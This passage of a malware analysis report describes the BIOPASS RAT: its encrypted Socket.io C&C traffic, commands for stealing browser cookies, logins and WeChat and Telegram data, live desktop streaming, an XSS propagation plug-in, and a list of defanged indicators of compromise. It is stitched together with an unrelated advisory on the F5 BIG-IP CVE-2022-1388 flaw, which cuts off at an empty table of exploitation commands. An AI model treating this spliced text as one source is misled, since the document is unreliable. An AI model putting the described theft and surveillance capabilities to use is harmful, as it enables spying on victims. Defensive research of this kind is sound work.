The BPS backdoor global configuration variable The backdoor communicates with the C&C server using the Socket.io protocol.
"The C&C communication is encrypted with AES ECB algorithm using a hard-coded password, ZLIB compression, and base85 encoding."
Figures 18 and 19 show how the malware sends the “join” event to initialize C&C communication and attach the victim’s encrypted data.
Figure 18.
Encoded “join” event sent to the C&C server Figure 19.
Decoded “join” event sent to the C&C server.
"It’s important to note that attributes like IP address, computer and username, architecture, installed antivirus, and geolocation are included."
The BIOPASS RAT malware registers three custom Socket.io event handlers:
1. The “notice” handler is used for checking the connection with the C&C server.
The backdoor regularly sends a “notice” event to the server and records the timestamp if it also receives a “notice” event as the response.
"If the malware doesn’t receive any “notice” event within a hard-coded threshold period, it will restart."
"2. The “set key” handler is used for accepting the victim ID, a random string with six characters, assigned by the C&C server."
It will be attached in each of commands sent from the server and will also be used as the folder name on a cloud storage service to save the stolen data.
The victim ID will be stored in the “bps.key” file.
3. The “accept task” handler is the main handler used to process the command sent from the C&C server and to return the execution result.
We share more details of each command in the next section.
"After the malware joins the C&C server, the server will assign a victim ID with “set key” event and send multiple “accept task” events with the commands “ScreenShot”, “SnsInfo”, “PackingTelegram”, “GetBrowsersCookies”, “GetBrowsersLogins”, “GetBrowsersHistories”, and “GetBrowsersBookmarks” to instruct the malware to collect private data from the victim."
A closer look at the BIOPASS RAT commands
"The BIOPASS RAT malware implements multiple commands, most of which are self-explanatory."
"A summary of commands is listed in Table 2, while additional details of some commands are explained in the following section."
"Command Behavior Compress_Files Compresses specified files or directories to a ZIP archive Decompress_File Extracts files from a specified ZIP archive AutoRun Creates a scheduled task for persistence CloseEverything Kills the Everything process with the command “TASKKILL /F /IM Everything.exe” OpenEverything Downloads and runs Everything from voidtools CloseFFmpegLive Kills the FFmpeg process with the command “TASKKILL /F /IM ffmpeg.exe” OpenFFmpegLive Downloads and runs FFmpeg (for screen video capture) DeleteFile Deletes files or directories at specified locations CreateDir Creates a directory at a specified location ShowFiles Gets the disk partition or lists a specified directory with detailed information, including file name, file path, size, create time, and time of modification Download_File Downloads a URL and saves the file to a specified location Upload_File Uploads the victim’s files to cloud storage uUninstall Kills the BIOPASS RAT process and deletes installed files. CloseObsLive Kills the OBS process with command “TASKKILL /F /IM obs64.exe” Open_Obs_Live Downloads OBS Studio and starts live streaming ProcessList Lists processes on the victim’s environment and their process identifier (PID) KillProcess Kills the process specified by PID with the TASKKILL command ScreenShot Takes a screenshot and uploads it to cloud storage Shell Executes commands or scripts (subcommands with prefixes subprocess, python, noreturn, getversion, restart) SnsInfo Lists QQ, WeChat, and Aliwangwang directories InstallTcpdump Downloads and installs the tcpdump tool PackingTelegram Compresses and uploads Telegram's “tdata” directory to cloud storage CloseProxy Kills frpc process with command “TASKKILL /F /IM frpc.exe” OpenProxy Downloads and installs the frp proxy client in the “%PUBLIC%” folder OpenVnc Downloads and installs jsmpeg-vnc tool in the “%PUBLIC%/vnc/” folder CloseVnc Kills the VNC process with the command “TASKKILL /F /IM vdwm.exe” GetBrowsersCookies Decrypts the cookie file of the browser and uploads it to cloud storage GetBrowsersLogins Decrypts the login file of the browser and uploads it to cloud storage GetBrowsersHistories Uploads the history file of the browser to cloud storage GetBrowsersBookmarks Uploads the bookmark file of the browser to cloud storage Table 2."
BIOPASS RAT commands OpenEverything The malware downloads “Everything” files if the “Everything” binary is not found in the “%TEMP%” folder.
"It then changes the port number of the HTTP server inside the configuration file and starts the Everything process, which will open an HTTP server to allow the threat actor to access the file system of the victim."
OpenFFmpegLive The malware downloads FFmpeg files if they are not found on the victim’s machine.
"Next, it starts the FFmpeg process to monitor the victim’s desktop via RTMP live streaming to the cloud."
The malicious actor can then connect to the relevant RTMP address to watch the streaming.
Open_Obs_Live
The malware downloads OBS Studio files if the OBS folder and config file are not found in the root directory.
It writes the basic config and RTMP config of OBS and then starts the OBS process to monitor the victim’s desktop using RTMP live streaming to the cloud.
The malicious actor can connect to the relevant RTMP address to watch the streaming.
Figure 20.
"The script used to download OBS Studio, prepare the configuration, and start the process ScreenShot"
The malware downloads the screenshot-cmd tool if it is not found in the root directory.
It takes a screenshot of the victim’s screen with the tool and saves it as a PNG file with a random number as the file name.
The malware will then upload the screenshot files to cloud storage.
Shell
The malware uses a number of methods to execute the shell command or script.
"The “Shell” command instructs the malware to execute a command using the Python function “win32api.ShellExecute” and to return the result to a C&C server, applying a 60-second timeout for command execution."
"If the command has one of the following prefixes, it will perform a specific behavior:"
1. “subprocess”: executes a system command using the Python function “subprocess.Popen”.
2. “python”: executes a Python script delivered with the command.
3. “noreturn”: executes a system command using the Python function “win32api.ShellExecute” without waiting for the result.
4. “getversion”: returns the string “20200202”.
5. “restart”: kills the process itself and restarts it via scheduled malicious tasks. SnsInfo
"The command will list the installation directory of several popular instant messaging applications including WeChat, QQ, and Aliwangwang and return this information to the C&C server."
Figures 21 and 22 show the result of running “SnsInfo” command to enumerate messengers.
Figure 21.
"Encoded SUBMIT RESULT command sent to C&C server Figure 22. Decoded SUBMIT RESULT command sent to C&C server None of the Chinese messenger applications has been installed on our testing machine, which explains the result seen in the images."
GetBrowsersCookies This command is designed to steal cookie information from browsers.
It will read the “Local State” file to grab the AES secret key of Google Chrome-based browsers.
"Depending on the different argument “type” delivered with the command, it performs different behaviors."
"If the value of the “type” argument is “Chrome”, it will use the AES secret key or DPAPI (for Chrome versions before 80) to decrypt the cookie file."
The decrypted result will be sent to the C&C server.
Figure 23.
The script to decrypt Chrome’s file with AES or DPAPI decryption If the value of the “type” argument is “File”
", it will directly upload the cookie file to cloud storage."
"The command that we received showed that the targeted browsers include Google Chrome, Microsoft Edge Beta, 360 Chrome, QQ Browser, 2345 Explorer, Sogou Explorer, and 360 Safe Browser."
Figure 24.
Code showing the command to target Sogou Explorer GetBrowsersLogins
"This command has a nearly identical function to “GetBrowsersCookies”, although it targets a browser’s “Login Data” files instead."
Additional Findings on BIOPASS RAT
"Although these are not implemented inside the BIOPASS RAT malware, we have observed two additional plug-ins that are written in Python (“getwechatdb” and “xss_spoof”) and were deployed by the threat actor to a victim who had been infected with Cobalt Strike."
The script “getwechatdb” is used for exfiltrating the chat history from the WeChat Windows client.
The script will detect the version of the installed WeChat client and grab the decryption key and the user ID.
The predefined list of offsets is used to locate where the decryption key and the user ID are embedded.
The list supports 36 different versions of memory offsets for the message client.
The script will then upload database files inside the WeChat folder including “MicroMsg.db” to cloud storage.
These database files are used for saving the chat history.
"Finally, the script will print out the client ID and the decryption key that allows the malicious actors to decrypt the stolen database files of the chat history."
Figure 25.
A predefined list of memory offset intended to grab information from different versions of WeChat Figure 26.
"The script used to exfiltrate WeChat chat database files The other plug-in, “xss_spoof”, is an archive that contains multiple Python scripts."
The scripts are designed for web server infection via a cross-site scripting (XSS) attack.
"This plug-in can inject malicious scripts into the response of the victim’s web server by leveraging the WinDivert package, which is used to sniff and manipulate the network traffic on Windows."
The scripts intercept HTTP GET requests that are sent to port 80.
An “ignore” list is used to filter the file extensions of URLs to avoid manipulating resources that are not JavaScript or HTML.
The script then modifies the original JavaScript or HTML content and delivers it to website visitors.
Figure 27.
The JavaScript payload used to replace the original script of compromised websites The delivered script is almost the same as the malicious script previously discussed in the section on the watering hole attack.
The script performs checks by scanning localhost to determine if the machine is infected by BIOPASS RAT while showing the fake updated webpages.
It is likely that the malicious actors compromised the web servers first and then ran “xss_spoof” for propagation.
Figure 28.
The main script used to manipulate traffic with WinDivert Potential links with the Winnti group
We have found several connections between BIOPASS RAT and the Winnti Group:
1. We discovered that many BIOPASS RAT loader binaries were signed with two valid certificates.
It is well known that the Winnti Group has previously used stolen certificates from game studios to sign its malware.
"Certificate Thumbprint Valid From Valid To EFB70718BC00393A01694F255A28E30E9D2142A4 12:00 a.m., Jan. 2, 2019 11:59 p.m., Mar. 2, 2021 8CE020AA874902C532B9911A4DCA8EFFA627DC80 12:00 a.m., Sept. 6, 2018 11:59 p.m., Oct. 5, 2021 Table 3."
"Information from the stolen certificates 2. While checking the stolen certificates, we found a server-side variant of the Derusbi malware sample (e5fdb754c1a7c36c288c46765c9258bb2c7f38fa2a99188a623182f877da3783) that was signed with the same stolen certificate."
Derusbi is known to be used by multiple advanced persistent threat (APT) groups.
The server-side variant has also been noted to be used as a malware loader by the Winnti Group.
3. We found an interesting Cobalt Strike loader (a7e9e2bec3ad283a9a0b130034e822c8b6dfd26dda855f883a3a4ff785514f97) that embeds a URL that leads to the BIOPASS RAT loader.
"However, the URL is unused and was likely left inside the loader as a mistake."
"The Cobalt Strike loader, which has a PDB string “C:\Users\test\Desktop\fishmaster\x64\Release\fishmaster.pdb”, connects to the C&C server “download[.]google-images[.]ml”."
The domains and the PDB string have been mentioned in a recent report and have been attributed to the Winnti Group.
"While these connections allow us to link the malware to the Winnti Group, the different targets between BIOPASS RAT and the current operations by Winnti’s that we are tracking makes associating the two more difficult."
BIOPASS RAT highlights the importance of downloading from trusted sources BIOPASS RAT is a sophisticated type of malware that is implemented as Python scripts.
"It possesses many features, such as the ability to use scheduled tasks as a method of maintaining persistence in the infected system."
The malware abuses publicly available tools and cloud services for its malicious behavior.
"Given that the malware loader was delivered as an executable disguised as a legitimate update installer on a compromised website, we advise users to be careful with regard to the applications that they download."
"As much as possible, it is recommended to download apps only from trusted sources and official websites to avoid being compromised by attacks such as the one discussed here."
"Organizations can also help protect their end users by implementing security solutions that provide a multilayered defense system that helps with detecting, scanning, and blocking malicious URLs."
"Note that we’ve submitted an abuse report to Alibaba, but we have yet to receive feedback at the time of publication."
Indicators of Compromise (IoCs) SHA256 Filename Note Analysis 84fbf74896d2a1b62d73b9a5d0be2f627d522fc811fe08044e5485492d2d4249 big.txt BIOPASS RAT Python Script (Version 3) TrojanSpy.Python.BIOPASS.A f3c96145c9d6972df265e12accfcd1588cee8af1b67093011e31b44d0200871f c1222.txt BIOPASS RAT Python Script (C1222 module) Trojan.Python.BIOPASS.A 0f8a87ca5f94949904804442c1a0651f99ba17ecf989f46a3b2fde8de455c4a4 c1222.txt BIOPASS RAT Python Script (C1222 module) Trojan.Python.BIOPASS.A d8b1c4ad8f31c735c51cb24e9f767649f78ef5c571769fbaac9891c899c33444 c1222.txt BIOPASS RAT Python Script (C1222 module)
Trojan.
Python.BIOPASS.A ee4150f18ed826c032e7407468beea3b1f738ba80b75a6be21bb8d59ee345466
c1222.txt BIOPASS RAT Python Script (C1222 module) Trojan
.Python.BIOPASS.A 34be85754a84cc44e5bb752ee3a95e2832e7be1f611dd99e9a1233c812a6dad2 c1222.txt BIOPASS RAT Python Script (C1222 module) Trojan
.Python.BIOPASS.A 30ccfbf24b7c8cc15f85541d5ec18feb0e19e75e1e4d2bca9941e6585dad7bc7 cdaemon.txt BIOPASS RAT Python Script (Cdaemon module) Trojan
.Python.BIOPASS.A f21decb19da8d8c07066a78839ffd8af6721b1f4323f10a1df030325a1a5e159 cdaemon.txt BIOPASS RAT Python Script (Cdaemon module)
Trojan.
Python.BIOPASS.A
40ab025d455083500bfb0c7c64e78967d4d06f91580912dccf332498681ebaf6
cdaemon.txt BIOPASS RAT Python Script (Cdaemon module) Trojan
.Python.BIOPASS.A e479823aa41d3f6416233dba8e765cf2abaa38ad18328859a20b88df7f1d88d5 sc2.txt BIOPASS RAT encoded Cobalt Strike shellcode Trojan.Win32.COBEACON.A e567fd0f08fdafc5a89c9084373f3308ef464918ff7e4ecd7fb3135d777e946d sc3.txt
BIOPASS RAT encoded Cobalt Strike shellcode Trojan.Win32.COBEACON.A 0c8c11d0206c223798d83d8498bb21231bbeb30536a20ea29a5d9273bc63313d s.txt BIOPASS RAT encoded Cobalt Strike shellcode Trojan.Win32.COBEACON.A 2beabd8a9d9a485ab6d850f67ec25abbd66bf97b933ecc13cf0d63198e9ba26e x.txt Python script of Cobalt Strike shellcode loader Trojan.Python.COBEACON.A 00977e254e744d4a242b552d055afe9d6429a5c3adb4ba169f302a53ba31795d ﻿1-CS-443.lua LUA script of Cobalt Strike shellcode loader Trojan.Win32.COBEACON.BG dbb6c40cb1a49f4d1a5adc7f215e8e15f80b9f0b11db34c84e74a99e41671e06 Online.txt BIOPASS RAT Python Script (local online server) Trojan.Python.BIOPASS.A 943e8c9b0a0a37237ec429cb8a3ff3b39097949e6c57baf43918a34b0110dd8f getwechatdb.txt BIOPASS RAT Python Script (getwechatdb plugin script) TrojanSpy.Python.BIOPASS.A 760fe7645134100301c69289a366bb92ab14927a7fbb9b405c1352989f16488c wechat.txt BIOPASS RAT Python Script (getwechatdb plugin script) TrojanSpy.Python.BIOPASS.A bdf7ebb2b38ea0c3dfb13da5d9cc56bf439d0519b29c3da61d2b2c0ab5bc6011 xss_spoof.zip BIOPASS RAT Python Script (xss_spoof plugin package) Trojan.Python.BIOPASS.A e3183f52a388774545882c6148613c67a99086e5eb8d17a37158fc599ba8254b x.js XSS watering hole attack script Trojan.JS.BIOPASS.A d3956e237066a7c221cc4aaec27935d53f14db8ab4b1c018c84f6fccfd5d0058 script.txt XSS attack JavaScript payload Trojan.JS.BIOPASS.A 4e804bde376dc02daedf7674893470be633f8e2bda96fa64878bb1fcf3209f60 xss.txt XSS attack HTML payload Trojan.HTML.BIOPASS.A 05d1c273a4caeae787b2c3faf381b5480b27d836cd6e41266f3eb505dcee6186 flash.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 09530096643b835cff71a1e48020866fd0d4d0f643fe07f96acdcd06ce11dfa4 test-ticker.exe BIOPASS RAT Loader Backdoor.
Win32.BIOPASS.A
0b16dfa3e0bbcc7b04a9a43309e911059a4d8c5892b1068e0441b177960d3eee
Silverlight_ins.exe BIOPASS RAT Loader
Backdoor.Win64.BIOPASS.A 0f18694b400e14eb995003541f16f75a5afc2478cc415a6295d171ba93565a82 flash_installer.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 11b785e77cbfa2d3849575cdfabd85d41bae3f2e0d33a77e7e2c46a45732d6e4 System.exe
BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
2243c10b1bd64dfb55eda08bc8b85610d7fa5ba759527b4b4dd16dfac584ef25
test3.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 281c938448e32eb12fe8c5439ef06cea848668cf57fed5ad64b9a8d1e07de561
flash1.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 2b580af1cdc4655ae75ef503aba7600e05cdd68b056a9354a2184b7fbb24db6f Silverlight_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 30a65a54acfbf8d412ade728cad86c5c769befa4e456f7c0e552e1ab0862a446 flash-64.exe
BIOPASS RAT Loader Backdoor.Win32.BIOPASS.A 30d9ffd4b92a4ed67569a78ceb25bb6f66346d1c0a7d6d6305e235cbdfe61ebe Silverlight_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 3195c355aa564ea66b4b37baa9547cb53dde7cf4ae7010256db92fff0bde873d flash.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 32a3934d96a8f2dae805fa28355cd0155c22ffad4545f9cd9c1ba1e9545b39ac
test.exe BIOPASS RAT Loader Backdoor.
Win32.BIOPASS.A
32c1460ba5707783f1bbaedab5e5eab21d762094106d6af8fa6b2f0f0d777c1a
test3.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 344cdbc2a7e0908cb6638bc7b81b6b697b32755bad3bed09c511866eff3876c7
test4.exe BIOPASS RAT Loader Backdoor.Win32.BIOPASS.A 3589e53c59d9807cca709387bbcaaffc7e24e15d9a78425b717fc55c779b928e
flash.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 36e3fcd6a4c7c9db985be77ea6394b2ed019332fdae4739df2f96a541ea52617 Silverlight.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 3e8f8b8a5f70c195a2e4d4fc7f80523809f6dbf9ead061ce8ef04fb489a577cf test-flash.exe BIOPASS RAT Loader Backdoor.Win32.BIOPASS.A 5d7aa3474e734913ecb4b820c0c546c92f7684081c519eecd3990e11a19bf2ba flash_installer.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 5fd2da648068f75a4a66b08d6d93793f735be62ae88085a79d839b6a0d6d859a flash1.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 660cef8210f823acb0b31d78fbce1d6f3f8c4f43231286f7ac69f75b2c42c020 flashplayerpp_install_cn.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 69d930050b2445937ec6a4f9887296928bf663f7a71132676be3f112e80fe275 test.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 6a0976e5f9d07ff3d80fa2958976183758ba5fcdd4645e391614a347b4b8e64b f0b96efe2f714e7bddf76cc90a8b8c88_se.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 6ee8f6a0c514a5bd25f7a32210f4b3fe878d9d417a7ebe07befc285131bae10e news.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 75e03f40a088903579a436c0d8e8bc3d0d71cf2942ad793cc948f36866a2e1ad silverlight_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 7d0d7d416db5bd7201420982987e213a129eef2314193e4558a24f3c9a91a38e flash_installer.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 7f4e02a041ca7cfbdc79b96a890822fd7c37be67b1f6c9e07596e6aec57ccdc0 Silverlight.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 8445c0189735766edf0e3d01b91f6f98563fef272ac5c92d3701a1174ad072dd Silverlight_ins.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 89c0b2036ce8d1d91f6d8b8171219aafcd6237c811770fa16edf922cedfecc54 MTYwOTI1MzEzNQ==.exe BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
8b5d4840bbdce0798950cd5584e3d4564581a7698bc6cfb2892c97b826129cec Silverlight_ins.exe
BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
932B45AB117960390324678B0696EF0E07D7F8DE1FA0B94C529F243610F1DCC9
flash_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 98a91356e0094c96d81bd27af407dd48c3c91aaf97da6794aeb303597a773749 Silverlight1.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e test.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4 Silverlight1.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A 9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798 test.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31 test.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939 test.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c Silverlight_ins.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999 Silverlight_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A ba44c22a3224c3a201202b69d86df2a78f0cd1d4ac1119eb29cae33f09027a9a Silverlight2.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A bd8dc7e3909f6663c0fff653d7afbca2b89f2e9bc6f27adaab27f640ccf52975 Silverlight.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A bf4f50979b7b29f2b6d192630b8d7b76adb9cb65157a1c70924a47bf519c4edd test.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A c11906210465045a54a5de1053ce0624308a8c7b342bb707a24e534ca662dc89 test-flash.exe BIOPASS RAT Loader Backdoor.Win32.BIOPASS.A c3fa69e15a63b151f8d1dc3018284e153ad2eb672d54555eaeaac79396b64e3b test.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5 flashplayerpp_install_cn.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A c8542bffc7a2074b8d84c4de5f18e3c8ced30b1f6edc13047ce99794b388285c flash2.exe BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
cce6b17084a996e2373aaebbace944a17d3e3745e9d88efad4947840ae92fd55
Silverlight_ins.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A d18d84d32a340d20ab07a36f9e4b959495ecd88d7b0e9799399fcc4e959f536b flash_installer.exe
BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
e4109875e84b3e9952ef362abc5b826c003b3d0b1b06d530832359906b0b8831
flash.exe BIOPASS RAT Loader
Backdoor.Win64.BIOPASS.A e52ea54cfe3afd93a53e368245c5630425e326291bf1b2599b75dbf8e75b7aeb flashplayer_install_cn.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A f1ad25b594a855a3c9af75c5da74b44d900f6fbb655033f9a98a956292011c8e Silverlight.exe
BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A fa1d70b6b5b1a5e478c7d9d840aae0cc23d80476d9eea884a73d1b7e3926a209 64.exe BIOPASS RAT Loader Backdoor.Win64.BIOPASS.A fa7fbca583b22d92ae6d832d90ee637cc6ac840203cd059c6582298beb955aee test.exe BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
fb770a3815c9ebcf1ba46b75b8f3686acc1af903de30c43bab8b86e5b46de851
test4.exe BIOPASS RAT Loader
Backdoor.
Win64.BIOPASS.A
fb812a2ccdab0a9703e8e4e12c479ff809a72899374c1abf06aef55abbbf8edc
flash_installer.exe BIOPASS RAT Loader Backdoor.
Win64.BIOPASS.A
ee2e9a1d3b593fd464f885b734d469d047cdb1bc879e568e7c33d786e8d1e8e2
aos.exe BIOPASS RAT binary (PyInstaller) Trojan.Win32.BIOPASS.A afbfe16cbdd574d64c24ad97810b04db509505522e5bb7b9ca3b497efc731045 socketio.exe BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A 0b9f605926df4ff190ddc6c11e0f5839bffe431a3ddfd90acde1fcd2f91dada3 socketio.exe BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A 6fc307063c376b8be2d3a9545959e068884d9cf7f819b176adf676fc4addef7d flash_ins_bak.exe BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A 7249ad971283e164b0489110c23f4e40c64ee49b49bcc5cd0d32d9e701ec2114 files.zip BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A de17e583a4d112ce513efd4b7cb575d272dcceef229f81360ebdfa5a1e083f11 fn.exe BIOPASS RAT binary (Nuitka) Trojan
.Win32.BIOPASS.A 17e43d31585b4c3ac6bf724bd7263761af75a59335b285b045fce597b3825ed0
"systemsetting.exe BIOPASS RAT binary (PyInstaller) Trojan.Win32.BIOPASS.A b3bd28951789ef7cfaf659e07e198b45b04a2f3cde268e6ede4d4f877959341e systemsetting.exe BIOPASS RAT binary (PyInstaller) Trojan.Win32.BIOPASS.A e0caebfbd2804fcde30e75f2c6d06e84b3bf89ed85db34d6f628b25dca7a9a0f YIZHI_SIGNED.exe BIOPASS RAT binary (PyInstaller) Trojan.Win32.BIOPASS.A 2503549352527cb0ffa1811a44481f6980961d98f9d5a96d5926d5676c31b9ee socketio.exe BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A 8ba72a391fb653b2cc1e5caa6f927efdf46568638bb4fc25e6f01dc36a96533b flashplayerpp_install_cn.exe BIOPASS RAT binary (Nuitka) Trojan.Win32.BIOPASS.A e5fdb754c1a7c36c288c46765c9258bb2c7f38fa2a99188a623182f877da3783 beep.sys Derusbi Trojan.Win64.DERUSBI.C a7e9e2bec3ad283a9a0b130034e822c8b6dfd26dda855f883a3a4ff785514f97 Browser_plugin (8).exe Cobalt Strike Loader Trojan.Win64.COBEACON.SUX IP/Domain/URL Note webplus-cn-hongkong-s-5faf81e0d937f14c9ddbe5a0[.]oss-cn-hongkong[.]aliyuncs[.]com Cloud storage bucket used to host BIOPASS RAT loaders softres[.]oss-accelerate[.]aliyuncs[.]com Cloud storage bucket used to host BIOPASS RAT loaders flashdownloadserver[.]oss-cn-hongkong[.]aliyuncs[.]com Cloud storage bucket used to host BIOPASS RAT modules and stolen data lualibs[.]oss-cn-hongkong[.]aliyuncs[.]com Cloud storage bucket used to host Cobalt Strike loader scripts bps-rhk[.]oss-cn-hongkong[.]aliyuncs[.]com Cloud storage bucket used for RTMP live streaming ﻿wxdget[.]oss-cn-hongkong[.]aliyuncs[.]com Cloud storage bucket used for storing stolen WeChat data chinanode[.]microsoft-update-service[.]com:38080 BIOPASS RAT C&C server 0x3s[.]com XSS attack domain update[.]flash-installer[.]com Associated fake installer domain update[.]flash-installers[.]com Associated fake installer domain flash[.]com[.]cm Associated fake installer domain flash[.]com[.]se Associated fake installer domain flashi[.]com[.]cn Associated fake installer domain flash[.]co[.]cm Associated fake installer domain 47[.]57[.]142[.]30 Cobalt Strike C&C server 47[.]57[.]186[.]151 Cobalt Strike C&C server 103[.]158[.]190[.]58 Cobalt Strike C&C server 207[.]148[.]100[.]49 Cobalt Strike C&C server microsoft[.]update[.]flash[.]com.se Cobalt Strike C&C server hxxps://webplus-cn-hongkong-s-5faf81e0d937f14c9ddbe5a0[.]oss-cn-hongkong.aliyuncs[.]com/Silverlight_ins.exe BIOPASS RAT loader download URL hxxps://webplus-cn-hongkong-s-5faf81e0d937f14c9ddbe5a0.oss-cn-hongkong.aliyuncs[.]com/flash_ins[.]exe BIOPASS RAT loader download URL hxxp://softres.oss-accelerate[.]aliyuncs[.]com/Silverlight[.]exe BIOPASS RAT loader download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/big.txt BIOPASS RAT script download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/Online.txt BIOPASS RAT script download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/files.zip Python runtime package download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/ServiceHub.zip Python runtime package download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/c1222.txt c1222 module script download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/cdaemon.txt cdaemon module download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/x.txt Cobalt Strike Python loader download URL hxxp://lualibs.oss-cn-hongkong[.]aliyuncs.com/x86/1-CS-443.lua Cobalt Strike Lua loader download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/s.txt Cobalt Strike shellcode download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/sc2.txt Cobalt Strike shellcode download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/sc3.txt Cobalt Strike shellcode download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/csplugins/getwechatdb.txt getwechatdb plug-in download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/csplugins/wechat.txt getwechatdb plug-in download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/csplugins/xss_spoof.zip xss_spoof plug-in download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/csplugins/xss.txt XSS payload download URL hxxp://flashdownloadserver[.]oss-cn-hongkong.aliyuncs[.]com/res/csplugins/script.txt XSS payload download URL hxxp://0x3s[.]com/x[.]js XSS injection URL Tags Malware | Endpoints | APT & Targeted Attacks | Research | Articles, News, Reports"
"This post is also available in: 日本語 (Japanese) On May 4, 2022, F5 released a security advisory for a remote code execution vulnerability in the iControlREST component of its BIG-IP product tracked in CVE-2022-1388."
Threat actors can exploit this vulnerability to bypass authentication and run arbitrary code on unpatched systems.
"This is a critical vulnerability that needs immediate attention, as it was given a 9.8 CVSS score."
"Since the release of this advisory, mass scanning activity has started to occur, seeking unpatched systems, and in-the-wild exploitation has begun. Palo Alto Networks released a Threat Prevention signature for the F5 BIG-IP Authentication Bypass Vulnerability (92570) and within just 10 hours, the signature triggered 2,552 times due to vulnerability scanning and active exploitation attempts."
Unit 42 recommends customers upgrade to the latest release of F5 BIG-IP products.
Palo Alto Networks Next Generation Firewall Threat Prevention customers are protected with Signature 92570.
Vulnerable Systems Mitigation Actions Observed in the Wild Conclusion Additional Resources Indicators of Compromise The F5 product vulnerable to CVE-2022-1388 is BIG-IP with the following versions: The vulnerability exists within the iControl REST framework used by BIG-IP.
We recommend that customers update their F5 BIG-IP deployments to one of the following versions that have patches to mitigate CVE-2022-1388:
"Until you can install the patched versions of BIG-IP, see the Mitigation section on the F5 security advisory for information on how to mitigate this vulnerability via a workaround to limit the vulnerable component to trusted networks. In response to the F5 security advisory, Palo Alto Networks released the Threat Prevention signature F5 BIG-IP Authentication Bypass Vulnerability (92570) on May 9."
"We observed this signature triggered 2,552 times between 4:47 and 14:00 UTC on May 10."
"We were able to analyze 2,151 packets that triggered the signature and observed both vulnerability scanning activity and active exploitation attempts."
Table 1 shows the commands that would be executed in the event of successful exploitation.
These were found by analysis of the packet captures that triggered the F5 BIG-IP Authentication Bypass Vulnerability signature.
Table 1. Commands observed in CVE-2022-1388 exploitation attempts.
